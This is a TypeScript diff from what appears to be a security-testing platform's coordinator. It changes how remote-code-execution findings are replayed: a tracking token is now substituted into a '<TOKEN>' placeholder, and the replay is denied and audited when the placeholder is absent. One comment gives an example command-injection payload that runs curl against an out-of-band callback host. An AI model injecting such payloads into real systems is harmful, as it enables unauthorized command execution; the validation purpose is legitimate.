@@ -535,15 +535,40 @@ export const startDecepticonSession = async (
 
     // Sprint 20 — publish a `validator.rce.replay` envelope for RCE candidates.
     // Token format: <candidateFindingId>.<tenantId>.<random8hex> (mirrors SSRF).
-    // OOB token embedded in affectedUrl via _cs_token= query param (S18 HIGH-2 fix mirror).
+    // OOB token embedded via <TOKEN> placeholder substitution (codex HIGH/P1 fix):
+    //   Decepticon-generated candidates must embed <TOKEN> inside the shell payload,
+    //   e.g. ?cmd=$(curl http://oob.lab/<TOKEN>/cb). Coordinator replaces <TOKEN> with
+    //   the generated rceToken so the executed shell command carries it to the OOB receiver.
+    //   Sibling _cs_token= appending does NOT work for RCE — the shell reads the literal
+    //   command string and never sees surrounding query params.
     if (candidate.type === 'rce') {
+      if (!candidate.affectedUrl.includes('<TOKEN>')) {
+        await emitAudit(
+          { db: deps.db },
+          {
+            tenantId: input.tenantId,
+            action: 'validator.rce.replay_denied',
+            outcome: 'denied',
+            actorType: 'service',
+            actorId: COORDINATOR_ACTOR_ID,
+            actorName: 'coordinator',
+            resourceType: 'candidate_finding',
+            resourceId: candidateFindingId,
+            ...(input.projectId ? { projectId: input.projectId } : {}),
+            assessmentId: input.assessmentId,
+            ip: null,
+            userAgent: null,
+            traceId: input.traceId,
+            metadata: { reason: 'token_placeholder_missing', affectedUrl: candidate.affectedUrl },
+          },
+        );
+        continue;
+      }
       const randomHex8 =
         deps.randomHex8?.() ??
         (await import('node:crypto').then((m) => m.randomBytes(4).toString('hex')));
       const rceToken = `${candidateFindingId}.${input.tenantId}.${randomHex8}`;
-      const rceReplayUrl = candidate.affectedUrl.includes('?')
-        ? `${candidate.affectedUrl}&_cs_token=${rceToken}`
-        : `${candidate.affectedUrl}?_cs_token=${rceToken}`;
+      const rceReplayUrl = candidate.affectedUrl.replaceAll('<TOKEN>', rceToken);
       const rceEnvelope: JobEnvelope = {
         jobId: randomUUID(),
         tenantId: input.tenantId,
